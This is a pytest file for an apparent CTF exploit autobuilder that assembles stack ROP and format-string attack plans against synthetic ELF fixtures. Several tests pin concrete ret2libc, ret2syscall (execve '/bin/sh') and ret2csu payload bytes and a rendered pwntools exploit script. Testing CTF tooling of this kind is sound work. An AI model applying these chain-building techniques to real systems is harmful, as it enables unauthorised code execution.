"""Deterministic, offline tests for the stack ROP / format-string autobuilder (B-025).

Every ELF fixture is synthesised in-process (no real challenge binary is committed or executed), and
the planner's strategy logic is exercised both on hand-built recon reports (pure, no I/O) and end to
end on the synthetic ELFs.  Nothing here runs a binary or opens a socket.
"""
from __future__ import annotations

import dataclasses
import struct
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

import pwn_autobuild as A  # noqa: E402
from ctf import event  # noqa: E402


# --------------------------------------------------------------------------- synthetic ELF builders

def _elf64_segment(code: bytes, *, etype: int = 2, machine: int = 62, gnu_stack_x=None, interp=False):
    """A minimal ELF64 with one executable PT_LOAD segment (no section/symbol table): enough for
    gadget + mitigation recognition.  `gnu_stack_x`: None omits PT_GNU_STACK, False adds a non-exec
    one (NX on), True an exec one (NX off).  `interp`: add a PT_INTERP so an ET_DYN reads as PIE."""
    ec = "<"
    phdrs = []
    # PT_LOAD R+X over the whole file; vaddr chosen so code_off maps to 0x401000+code_off region.
    load_vaddr = 0x400000
    phdrs.append(("load", 1, 5))  # filled below once code_off is known
    if gnu_stack_x is not None:
        phdrs.append(("gnustack", 0x6474E551, 7 if gnu_stack_x else 6))
    if interp:
        phdrs.append(("interp", 3, 4))
    phnum = len(phdrs)
    code_off = 64 + phnum * 56
    code_vaddr = load_vaddr + code_off
    blob = bytearray()
    for kind, ptype, flags in phdrs:
        if kind == "load":
            filesz = code_off + len(code)
            blob += struct.pack(ec + "IIQQQQQQ", 1, 5, 0, load_vaddr, load_vaddr, filesz, filesz, 0x1000)
        elif kind == "gnustack":
            blob += struct.pack(ec + "IIQQQQQQ", ptype, flags, 0, 0, 0, 0, 0, 0x10)
        else:  # interp
            blob += struct.pack(ec + "IIQQQQQQ", ptype, flags, code_off, code_vaddr, code_vaddr, 1, 1, 1)
    ident = b"\x7fELF" + bytes((2, 1, 1, 0)) + b"\x00" * 8
    ehdr = ident + struct.pack(ec + "HHIQQQIHHHHHH", etype, machine, 1, code_vaddr, 64, 0, 0,
                               64, 56, phnum, 64, 0, 0)
    return bytes(ehdr + blob + code), code_vaddr


def _elf64_with_symbols(code: bytes, symbols, *, code_vaddr=0x401000, etype: int = 2,
                        gnu_stack_x=None, interp=False):
    """An ELF64 with program headers (for mitigations), a .text section (for gadgets) and a
    .symtab/.strtab (for symbol/import/win recognition via pyelftools).

    `symbols`: iterable of (name, value, shndx, stype, sbind) where shndx 1 == defined in .text and
    0 == SHN_UNDEF (an import); stype 2 == STT_FUNC, 0 == STT_NOTYPE; sbind 1 == STB_GLOBAL.
    """
    ec = "<"
    phdrs = [("load", 1, 5)]
    if gnu_stack_x is not None:
        phdrs.append(("gnustack", 0x6474E551, 7 if gnu_stack_x else 6))
    if interp:
        phdrs.append(("interp", 3, 4))
    phnum = len(phdrs)
    code_off = 64 + phnum * 56
    load_vaddr = code_vaddr - code_off

    # String tables.
    strtab = bytearray(b"\x00")
    name_off = {}
    for name, *_ in symbols:
        name_off[name] = len(strtab)
        strtab += name.encode() + b"\x00"
    shstr = bytearray(b"\x00")
    sh_name_off = {}
    for sname in (".text", ".symtab", ".strtab", ".shstrtab"):
        sh_name_off[sname] = len(shstr)
        shstr += sname.encode() + b"\x00"

    # Symbol table (entry 0 is the null symbol).
    syments = bytearray(struct.pack(ec + "IBBHQQ", 0, 0, 0, 0, 0, 0))
    for name, value, shndx, stype, sbind in symbols:
        st_info = (sbind << 4) | stype
        syments += struct.pack(ec + "IBBHQQ", name_off[name], st_info, 0, shndx, value, 0)

    # File layout.
    strtab_off = code_off + len(code)
    shstr_off = strtab_off + len(strtab)
    symtab_off = (shstr_off + len(shstr) + 7) & ~7
    shoff = symtab_off + len(syments)

    # Program headers.
    phblob = bytearray()
    for kind, ptype, flags in phdrs:
        if kind == "load":
            filesz = code_off + len(code)
            phblob += struct.pack(ec + "IIQQQQQQ", 1, 5, 0, load_vaddr, load_vaddr, filesz, filesz, 0x1000)
        elif kind == "gnustack":
            phblob += struct.pack(ec + "IIQQQQQQ", ptype, flags, 0, 0, 0, 0, 0, 0x10)
        else:
            phblob += struct.pack(ec + "IIQQQQQQ", ptype, flags, code_off, code_vaddr, code_vaddr, 1, 1, 1)

    # Section headers: null, .text, .symtab, .strtab, .shstrtab.
    def shdr(name, stype, flags, addr, off, size, link=0, info=0, align=1, ent=0):
        return struct.pack(ec + "IIQQQQIIQQ", name, stype, flags, addr, off, size, link, info, align, ent)

    shdrs = b"".join([
        shdr(0, 0, 0, 0, 0, 0),
        shdr(sh_name_off[".text"], 1, 6, code_vaddr, code_off, len(code), align=1),
        shdr(sh_name_off[".symtab"], 2, 0, 0, symtab_off, len(syments), link=3, info=1, align=8, ent=24),
        shdr(sh_name_off[".strtab"], 3, 0, 0, strtab_off, len(strtab)),
        shdr(sh_name_off[".shstrtab"], 3, 0, 0, shstr_off, len(shstr)),
    ])

    ident = b"\x7fELF" + bytes((2, 1, 1, 0)) + b"\x00" * 8
    ehdr = ident + struct.pack(ec + "HHIQQQIHHHHHH", etype, 62, 1, code_vaddr, 64, shoff, 0,
                               64, 56, phnum, 64, 5, 4)
    out = bytearray(ehdr + phblob)
    assert len(out) == code_off
    out += code
    assert len(out) == strtab_off
    out += strtab
    assert len(out) == shstr_off
    out += shstr
    out += b"\x00" * (symtab_off - len(out))
    out += syments
    assert len(out) == shoff
    out += shdrs
    return bytes(out), code_vaddr


# Gadget bytes: pop rdi;ret / pop rsi;ret / pop rdx;ret / pop rax;ret / syscall;ret / bare ret / the
# two __libc_csu_init universal gadgets.
_POP_RDI = b"\x5f\xc3"
_POP_RSI = b"\x5e\xc3"
_POP_RDX = b"\x5a\xc3"
_POP_RAX = b"\x58\xc3"
_SYSCALL_RET = b"\x0f\x05\xc3"
_RET = b"\xc3"
_CSU_POP = b"\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3"
_CSU_CALL = b"\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc"


# --------------------------------------------------------------------------- cyclic / offset finder

def test_cyclic_matches_pwntools_default_and_round_trips():
    # pwntools' canonical de Bruijn prefix for the lowercase alphabet, n=4.
    assert A.cyclic(16) == b"aaaabaaacaaadaaa"
    pat = A.cyclic(200)
    # Every 4-byte window maps back to its own offset -> a live crash locates exactly.
    for off in (0, 1, 7, 40, 72, 100):
        assert A.cyclic_find(pat[off:off + 4]) == off
    # An integer crash value is packed little-endian by width before the search.
    crash = struct.unpack("<I", pat[72:76])[0]
    assert A.cyclic_find(crash, bits=32) == 72
    crash64 = struct.unpack("<Q", A.cyclic(300)[96:104])[0]
    assert A.cyclic_find(crash64, bits=64) == 96


def test_cyclic_find_absent_and_bad_input():
    assert A.cyclic_find(b"XXXX") == -1  # uppercase is outside the lowercase alphabet
    with pytest.raises(A.AutobuildError):
        A.cyclic_find(b"ab")  # fewer than n bytes


# --------------------------------------------------------------------------- static recognition

@pytest.mark.needs_tool("py:elftools")
def test_recognize_reads_mitigations_win_and_surface_from_a_symboled_elf():
    code = _POP_RDI + _RET
    symbols = [
        ("win", 0x401140, 1, 2, 1),               # a defined STT_FUNC matching WIN_RX
        ("__stack_chk_fail", 0, 0, 2, 1),          # canary present
        ("gets", 0, 0, 2, 1),                       # an overflow import
        ("printf", 0, 0, 2, 1),                     # a format import
        ("system", 0, 0, 2, 1),                     # a libc-shell import
    ]
    elf, base = _elf64_with_symbols(code, symbols, gnu_stack_x=False)  # NX on, non-PIE
    facts = A.recognize(elf)
    assert facts.arch == "amd64" and facts.bits == 64 and facts.supported
    assert facts.mitigations.nx == "enabled"
    assert facts.mitigations.pie == "disabled"
    assert facts.mitigations.canary == "enabled"
    assert ("win", 0x401140) in facts.win_functions
    assert "gets" in facts.overflow_surface
    assert "printf" in facts.format_surface
    assert "system" in facts.libc_shell
    assert facts.gadgets["pop rdi ; ret"] == base  # exact static address, from gadget_catalog
    assert facts.has_symbols


def test_recognize_degrades_by_name_without_symbols_but_still_reads_arch_and_gadgets():
    # A segment-only ELF has no symbol table: arch/gadgets/NX/PIE still recognise; win/canary cannot.
    elf, base = _elf64_segment(_POP_RDI + _RET, gnu_stack_x=False, interp=False)
    facts = A.recognize(elf)
    assert facts.arch == "amd64"
    assert facts.gadgets["pop rdi ; ret"] == base
    assert facts.mitigations.nx == "enabled"
    assert facts.win_functions == ()
    # Without pyelftools the degradation is named, never silent.
    if not facts.has_symbols:
        assert any("pyelftools" in n for n in facts.notes)


def test_pie_recognised_from_et_dyn_plus_interp():
    elf, _ = _elf64_segment(_RET, etype=3, interp=True)
    facts = A.recognize(elf)
    assert facts.mitigations.pie == "enabled"


def test_recognize_rejects_non_elf_by_name():
    with pytest.raises(A.AutobuildError, match="not an ELF"):
        A.recognize(b"MZ not an elf at all")
    with pytest.raises(A.AutobuildError):
        A.read_elf_facts(b"\x7fELF" + b"\x00" * 4)  # too short


# --------------------------------------------------------------------------- strategy selection (pure)

def _facts(arch="amd64", bits=64, *, nx="enabled", pie="disabled", relro="partial",
           canary="disabled", fortify="disabled", wins=(), ovf=("gets",), fmt=(), libc=(),
           gadgets=None, got=None, binsh=None):
    """Build BinaryFacts straight from a hand-written report + a fake gadget catalog."""
    report = dict(arch=arch, bits=bits,
                  protections=dict(nx=nx, pie=pie, relro=relro, canary=canary, fortify=fortify),
                  win_candidates=list(wins), overflow_funcs=list(ovf), format_funcs=list(fmt),
                  libc_shell=list(libc), sym_values={}, got_offsets=got or {}, has_symbols=True, notes=[])

    class _Cat:
        architecture, bits_ = arch, bits

        def __init__(self, g):
            self.architecture, self.bits, self._g = arch, bits, g

        def by_semantic(self):
            return {k: (v,) for k, v in self._g.items()}

    f = A.facts_from_report(report, _Cat(gadgets or {}))
    return f if binsh is None else dataclasses.replace(f, binsh=binsh)


def test_strategy_selection_covers_the_four_families():
    # ret2win: an overflow and a win function.
    assert A._choose_strategy(_facts(wins=[("win", 0x1)]), win=None) == "ret2win"
    # ret2syscall: no win, all syscall-setup gadgets present.
    g = {"pop rdi ; ret": 1, "pop rsi ; ret": 2, "pop rdx ; ret": 3, "pop rax ; ret": 4, "syscall ; ret": 5}
    assert A._choose_strategy(_facts(gadgets=g), win=None) == "ret2syscall"
    # ret2csu: need rdi/rsi/rdx, lack the direct pops, have the CSU universal gadgets.
    g2 = {"pop rdi ; ret": 1, A._CSU_POP: 10, A._CSU_CALL: 20}
    assert A._choose_strategy(_facts(gadgets=g2), win=None) == "ret2csu"
    # ret2libc: an overflow, no win, a direct arg gadget but no syscall route.
    assert A._choose_strategy(_facts(gadgets={"pop rdi ; ret": 1, "ret": 2}, libc=["system"]), win=None) == "ret2libc"
    # format_write: no overflow, a printf surface.
    assert A._choose_strategy(_facts(ovf=[], fmt=["printf"]), win=None) == "format_write"
    # none: nothing recognised.
    assert A._choose_strategy(_facts(ovf=[], fmt=[]), win=None) == "none"


def test_unsupported_architecture_declines_by_name():
    p = A.plan(_facts(arch="aarch64"))
    assert p.strategy == "none" and p.confidence == "none"
    assert any("aarch64" in n for n in p.notes)


# --------------------------------------------------------------------------- alignment-aware assembly

def test_amd64_ret2libc_inserts_one_alignment_ret_immediately_before_system():
    f = _facts(ovf=["read"], libc=["system"], gadgets={"pop rdi ; ret": 0x401256, "ret": 0x40101a})
    p = A.plan(f, buffer_offset=40, libc={"system": 0x7ffff7a52290, "/bin/sh": 0x7ffff7b9ac4a})
    roles = [s.role for s in p.slots]
    assert p.strategy == "ret2libc" and p.confidence == "concrete" and p.alignment_fixed
    assert roles == ["pop rdi ; ret", "arg:/bin/sh", "align", "call:system"]
    # The align slot sits immediately before the libc call -- order is load-bearing.
    assert roles.index("align") == roles.index("call:system") - 1
    # Concrete bytes: pad + the four little-endian words, in order.
    expect = b"A" * 40 + struct.pack("<QQQQ", 0x401256, 0x7ffff7b9ac4a, 0x40101a, 0x7ffff7a52290)
    assert p.payload == expect


def test_i386_ret2libc_has_no_alignment_ret():
    f = _facts("i386", 32, ovf=["gets"], libc=["system"], gadgets={"ret": 0x8049000})
    p = A.plan(f, buffer_offset=16, libc={"system": 0xF7E00000, "/bin/sh": 0xF7F00000})
    assert p.strategy == "ret2libc" and not p.alignment_fixed
    assert "align" not in [s.role for s in p.slots]
    assert p.payload == b"A" * 16 + struct.pack("<III", 0xF7E00000, 0x8049000, 0xF7F00000)


def test_ret2syscall_enters_a_raw_syscall_with_no_alignment_ret():
    g = {"pop rdi ; ret": 0x401, "pop rsi ; ret": 0x402, "pop rdx ; ret": 0x403,
         "pop rax ; ret": 0x404, "syscall ; ret": 0x405}
    f = _facts(ovf=["read"], gadgets=g, binsh=0x404000)
    p = A.plan(f, buffer_offset=8)
    assert p.strategy == "ret2syscall" and not p.alignment_fixed and p.confidence == "concrete"
    roles = [s.role for s in p.slots]
    assert "align" not in roles
    # rax is set to 59 (SYS_execve) and the final transfer is the syscall gadget.
    rax_imm = next(s for s in p.slots if s.role == "imm:rax")
    assert rax_imm.value == 59
    assert p.slots[-1].role == "syscall ; ret" and p.slots[-1].value == 0x405


def test_i386_ret2syscall_assembles_execve_via_int_0x80_with_exact_slots_and_bytes():
    # i386 is a supported arch and ret2syscall a named strategy, so the whole int-0x80 branch must be
    # pinned: the gadget set, SYS_execve number (0xB, NOT amd64's 59), the /bin/sh arg, the slot
    # order and the concrete payload bytes.  Mutating eax 0xB->0x0 here must fail this test.
    g = {"pop eax ; ret": 0x8049a0, "pop ebx ; ret": 0x8049b0, "pop ecx ; ret": 0x8049c0,
         "pop edx ; ret": 0x8049d0, "int 0x80 ; ret": 0x8049e0}
    f = _facts("i386", 32, ovf=["gets"], gadgets=g, binsh=0x804a024)
    p = A.plan(f, buffer_offset=16)
    assert p.strategy == "ret2syscall" and not p.alignment_fixed and p.confidence == "concrete"
    assert [s.role for s in p.slots] == [
        "pop eax ; ret", "imm:eax", "pop ebx ; ret", "arg:/bin/sh",
        "pop ecx ; ret", "imm:ecx", "pop edx ; ret", "imm:edx", "int 0x80 ; ret"]
    eax = next(s for s in p.slots if s.role == "imm:eax")
    assert eax.value == 0xB  # __NR_execve on i386
    # Exact bytes: pad + the nine little-endian dwords in order, with eax=0xB and /bin/sh staged.
    assert p.payload == b"A" * 16 + struct.pack(
        "<IIIIIIIII", 0x8049a0, 0xB, 0x8049b0, 0x804a024, 0x8049c0, 0, 0x8049d0, 0, 0x8049e0)


def test_ret2win_concrete_payload_and_pie_defers_to_a_leak():
    f = _facts(wins=[("win", 0x401196)], ovf=["gets"], gadgets={"ret": 0x40101a})
    p = A.plan(f, buffer_offset=72)
    assert p.strategy == "ret2win" and p.confidence == "concrete" and p.alignment_fixed
    assert p.payload == b"A" * 72 + struct.pack("<QQ", 0x40101a, 0x401196)
    # Same binary but PIE: the win address is a file offset, so the plan waits on a base leak.
    fp = _facts(pie="enabled", wins=[("win", 0x1196)], ovf=["gets"], fmt=["printf"], gadgets={"ret": 0x101a})
    pp = A.plan(fp, buffer_offset=72)
    assert pp.confidence in ("needs-leak", "needs-oracle") and pp.payload is None


# --------------------------------------------------------------------------- ret2csu register dance

def test_ret2csu_encodes_the_rbp_reentry_and_a_32bit_edi_arg():
    g = {A._CSU_POP: 0x4011a0, A._CSU_CALL: 0x401180, "ret": 0x40101a}
    f = _facts(ovf=["read"], gadgets=g, got={"system": {0x404018}}, binsh=0x404100)
    p = A.plan(f, buffer_offset=40)
    assert p.strategy == "ret2csu"
    roles = {s.role: s for s in p.slots}
    # The rbp=1 re-entry trick and the GOT function pointer are both present and concrete.
    assert roles["imm:rbp"].value == 1
    assert roles["ptr:r12"].value == 0x404018
    assert roles["imm:rbx"].value == 0
    assert A._CSU_POP in roles and A._CSU_CALL in roles
    # Calling an imported GOT slot needs no libc leak.
    assert [s.target for s in p.leak_walk] == []
    assert any("edi" in n for n in p.notes)


def test_ret2csu_without_the_universal_gadgets_reports_their_absence():
    f = _facts(ovf=["read"], gadgets={A._CSU_POP: 0x1}, got={"system": {0x2}})
    # Force the strategy: the universal pair is incomplete, so the plan must say so.
    p = A.plan(f, strategy="ret2csu", buffer_offset=8)
    assert any("universal gadgets are absent" in n for n in p.notes)


def test_an_ambiguous_symbol_or_got_name_is_dropped_never_guessed():
    # The never-guess-on-ambiguity invariant: when a symbol or GOT name resolves to more than one
    # address, `_single` drops it entirely rather than pick one, so no guessed address can enter a
    # chain.  A fake catalog supplies only the CSU universal gadgets (no direct pops), so the plan is
    # ret2csu and its ptr:r12 slot would take facts.got["system"] -- if that address were guessed.
    report = dict(
        arch="amd64", bits=64,
        protections=dict(nx="enabled", pie="disabled", relro="partial", canary="disabled", fortify="disabled"),
        win_candidates=[], overflow_funcs=["read"], format_funcs=[], libc_shell=[],
        # Both names resolve to TWO addresses: neither may be certified.
        sym_values={"system": {0x401000, 0x401100}},
        got_offsets={"system": {0x404018, 0x404090}},
        has_symbols=True, notes=[],
    )

    class _Cat:
        def __init__(self, g):
            self.architecture, self.bits, self._g = "amd64", 64, g

        def by_semantic(self):
            return {k: (v,) for k, v in self._g.items()}

    f = A.facts_from_report(report, _Cat({A._CSU_POP: 0x4011a0, A._CSU_CALL: 0x401180, "ret": 0x40101a}))

    # The ambiguous names are absent from both maps (not one arbitrary address picked from the set).
    assert "system" not in f.symbols
    assert "system" not in f.got
    # And the ambiguity must not be read as "the binary imports system" (no free ret2csu shell).
    assert f.libc_shell_in_binary() is False

    # The dependent slot stays a placeholder: no guessed GOT address feeds the concrete chain.
    p = A.plan(f, strategy="ret2csu", buffer_offset=40)
    assert p.strategy == "ret2csu"
    ptr = {s.role: s for s in p.slots}["ptr:r12"]
    assert ptr.value is None
    assert ptr.placeholder == "fn_ptr"


# --------------------------------------------------------------------------- leak walk / oracle

def test_leak_walk_orders_canary_then_pie_then_libc_and_names_the_oracle():
    # Canary + PIE + a format-string oracle present: two leaks, both via format-string, canary first.
    f = _facts(pie="enabled", canary="enabled", wins=[("win", 0x1)], ovf=["gets"], fmt=["printf"],
               gadgets={"ret": 0x101a})
    p = A.plan(f, buffer_offset=72)
    targets = [s.target for s in p.leak_walk]
    assert targets == ["canary", "pie_base"]
    assert all(s.via == "format-string" for s in p.leak_walk)
    assert p.confidence == "needs-leak"


def test_unrecognised_oracle_is_flagged_needs_oracle_not_guessed():
    # Canary on but no format primitive: the oracle is unknown -> a human/model must identify it.
    f = _facts(canary="enabled", wins=[("win", 0x1)], ovf=["gets"], fmt=[], gadgets={"ret": 0x101a})
    p = A.plan(f, buffer_offset=72)
    assert any(s.target == "canary" and s.via == "unknown" for s in p.leak_walk)
    assert p.confidence == "needs-oracle"
    assert p.payload is None  # never a guessed canary


def test_supplying_a_canary_drops_its_leak_step():
    f = _facts(canary="enabled", wins=[("win", 0x401196)], ovf=["gets"], fmt=["printf"],
               gadgets={"ret": 0x40101a})
    p = A.plan(f, buffer_offset=72, canary=0xdeadbeefcafe0000)
    assert "canary" not in [s.target for s in p.leak_walk]


def test_canary_replay_chain_packs_canary_then_saved_rbp_then_return():
    # With a supplied canary (leak resolved) and a non-PIE binary the chain is concrete.  The words
    # between the buffer and the return address are the replayed canary AND the saved-rbp padding
    # word -- both load-bearing, in that order, ahead of the alignment ret and the win address.
    # Dropping the saved_rbp word slides the return address one word early; the bytes catch exactly
    # that (the M2 mutation that removed saved_rbp must fail here).
    f = _facts(canary="enabled", wins=[("win", 0x401196)], ovf=["gets"], fmt=["printf"],
               gadgets={"ret": 0x40101a})
    canary = 0xdeadbeefcafe1234
    p = A.plan(f, buffer_offset=72, canary=canary)
    assert [s.role for s in p.slots] == ["canary", "saved_rbp", "align", "win"]
    assert p.confidence == "concrete"
    assert p.payload == b"A" * 72 + struct.pack("<QQQQ", canary, 0, 0x40101a, 0x401196)


def test_canary_present_non_pie_demotes_a_concrete_chain_to_needs_leak():
    # Non-PIE, so the assembler yields a concrete ret2win chain; but an UNSUPPLIED canary leak gates
    # it -- the plan must demote concrete -> needs-leak (via the format-string oracle) and refuse to
    # guess the canary, emitting no concrete payload.  Removing that demotion must fail this test.
    f = _facts(canary="enabled", wins=[("win", 0x401196)], ovf=["gets"], fmt=["printf"],
               gadgets={"ret": 0x40101a})
    p = A.plan(f, buffer_offset=72)  # no canary supplied
    assert [s.target for s in p.leak_walk] == ["canary"]
    assert all(s.via == "format-string" for s in p.leak_walk)
    assert p.confidence == "needs-leak"
    assert p.payload is None


def test_format_only_plan_points_at_the_format_string_builder():
    f = _facts(ovf=[], fmt=["printf"])
    p = A.plan(f)
    assert p.strategy == "format_write" and p.confidence == "needs-oracle"
    assert any("format_string_builder" in n for n in p.notes)


# --------------------------------------------------------------------------- pwntools rendering

def test_render_pwntools_is_text_only_and_carries_resolved_and_placeholder_slots():
    f = _facts(wins=[("win", 0x401196)], ovf=["gets"], gadgets={"ret": 0x40101a})
    p = A.plan(f, buffer_offset=72)
    text = A.render_pwntools(p, f, binary="./chall")
    assert "io.interactive()" in text and "p64(0x401196)" in text
    assert "offset = 72" in text
    # A plan with a placeholder renders a RESOLVE marker, never an invented value.
    fp = _facts(ovf=["read"], libc=["system"], gadgets={"pop rdi ; ret": 0x401256, "ret": 0x40101a})
    pp = A.plan(fp, buffer_offset=40)  # libc unresolved
    assert "RESOLVE" in A.render_pwntools(pp, fp)


def test_render_resolves_a_missing_gadget_to_a_valid_python_identifier():
    # amd64 ret2libc with NO `pop rdi ; ret` gadget and an unresolved libc: the degenerate no-gadget
    # slot must render as a valid identifier placeholder, never `p64(pop rdi ; ret)` (spaces and a
    # semicolon make that uncompilable).
    import ast
    f = _facts(ovf=["read"], libc=["system"], gadgets={})  # no gadgets, libc unresolved
    p = A.plan(f, buffer_offset=40)
    assert p.strategy == "ret2libc"
    text = A.render_pwntools(p, f)
    assert "p64(pop rdi ; ret)" not in text
    assert "p64(pop_rdi_ret)" in text  # the role slugged to a resolvable name
    # Every `payload += p64(<arg>)` argument parses as a python expression (identifier, attribute
    # like `libc.binsh`, or int) -- a raw gadget role with spaces would raise SyntaxError.
    for line in text.splitlines():
        if line.startswith("payload += p64("):
            arg = line.split("p64(", 1)[1].split(")", 1)[0]
            ast.parse(arg, mode="eval")


# --------------------------------------------------------------------------- engine entry (solve)

def _csctf():
    return event.load("csctf")


@pytest.mark.needs_tool("py:elftools")
def test_solve_builds_a_ret2win_plan_from_a_dropped_binary(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    code = _POP_RDI + _RET + b"\x90" * 8
    symbols = [("win", 0x401140, 1, 2, 1), ("gets", 0, 0, 2, 1)]
    elf, _ = _elf64_with_symbols(code, symbols)  # non-PIE, win + gets
    (chal / "vuln").write_bytes(elf)
    r = A.solve(chal, _csctf())
    assert r.status == "unsure"
    assert "ret2win" in r.notes
    md = chal / "recon" / "pwn_autobuild" / "vuln.plan.md"
    py = chal / "recon" / "pwn_autobuild" / "vuln.exploit.py"
    assert md.is_file() and py.is_file()
    assert "ret2win" in md.read_text()
    # The written plan file is cited as evidence.
    assert any(e.kind == "plan" for e in r.evidence)


def test_solve_returns_candidate_when_a_flag_literal_is_in_the_binary(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    elf, _ = _elf64_segment(_RET + b"CSCTF{autobuild_literal}\x00" + _POP_RDI + _RET)
    (chal / "leaky").write_bytes(elf)
    r = A.solve(chal, _csctf())
    assert r.status == "candidate"
    assert "CSCTF{autobuild_literal}" in r.flags


def test_symbol_blind_recon_never_certifies_a_concrete_chain():
    # Without pyelftools, canary / win / GOT recognition is blind: a canary present in the binary
    # reads as 'disabled'.  A chain that WOULD be concrete with symbols (here a forced ret2syscall
    # whose gadgets come from the symbol-free gadget_catalog) must be demoted off that blind path, so
    # a degraded run can never emit a confident-but-wrong payload.  The missing tool is named.
    g = {"pop rdi ; ret": 0x401, "pop rsi ; ret": 0x402, "pop rdx ; ret": 0x403,
         "pop rax ; ret": 0x404, "syscall ; ret": 0x405}
    blind = dataclasses.replace(_facts(ovf=[], gadgets=g, binsh=0x404000), has_symbols=False)
    p = A.plan(blind, strategy="ret2syscall", buffer_offset=8)
    assert p.strategy == "ret2syscall"
    assert p.confidence == "needs-recon"
    assert p.payload is None
    assert any("pyelftools" in n for n in p.notes)
    # Contrast: the SAME facts with symbols present ARE certified concrete, proving the guard (not a
    # missing gadget) is what withholds the payload on the blind path.
    seen = dataclasses.replace(blind, has_symbols=True)
    sp = A.plan(seen, strategy="ret2syscall", buffer_offset=8)
    assert sp.confidence == "concrete" and sp.payload is not None


def test_module_docstring_records_the_pwn_exploit_boundary():
    # The plan-vs-executes split between this engine and toolkits.pwn_exploit must be discoverable
    # in-tree (not only in the build log), so the see-also note stays pinned.
    assert "pwn_exploit" in A.__doc__
    assert "PLAN-ONLY" in A.__doc__


def test_solve_blocked_without_an_elf(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    (chal / "notes.txt").write_text("just a text handout, no binary")
    r = A.solve(chal, _csctf())
    assert r.status == "blocked"
    assert "ELF" in r.notes


def test_solve_reports_none_when_an_elf_has_no_exploit_surface(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    # A segment-only ELF: no overflow import, no format import -> nothing to assemble, no flag.
    elf, _ = _elf64_segment(_RET + _POP_RDI + _RET)
    (chal / "clean").write_bytes(elf)
    r = A.solve(chal, _csctf())
    assert r.status == "none"


def test_solve_derives_the_offset_from_a_cyclic_crash_value(tmp_path):
    chal = tmp_path / "chal"
    chal.mkdir()
    symbols = [("win", 0x401140, 1, 2, 1), ("gets", 0, 0, 2, 1)]
    elf, _ = _elf64_with_symbols(_POP_RDI + _RET, symbols)
    (chal / "vuln").write_bytes(elf)
    crash = struct.unpack("<Q", A.cyclic(300)[72:80])[0]
    r = A.solve(chal, _csctf(), crash=hex(crash))
    md = (chal / "recon" / "pwn_autobuild" / "vuln.plan.md").read_text()
    assert "buffer offset: 72" in md


# --------------------------------------------------------------------------- manifest / routing

def test_manifest_parses_and_matches_the_module():
    from ctf.engines import manifest
    path = REPO / "solvers" / "toolkits" / "pwn_autobuild.manifest.toml"
    m = manifest.load(path)
    assert m.id == "toolkits.pwn_autobuild"
    assert m.entry_raw == "solvers.toolkits.pwn_autobuild:solve"
    assert m.has("plan")
    assert m.routes  # at least one route, or it is a lint error


def test_route_reaches_the_autobuilder_for_a_ret2csu_pwn_challenge():
    from ctf.engines import manifest, router
    manifests = manifest.discover(REPO)
    hits = router.route("pwn", "a ret2csu leak oracle stack overflow", None)
    assert any(h.manifest.id == "toolkits.pwn_autobuild" for h in hits)


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
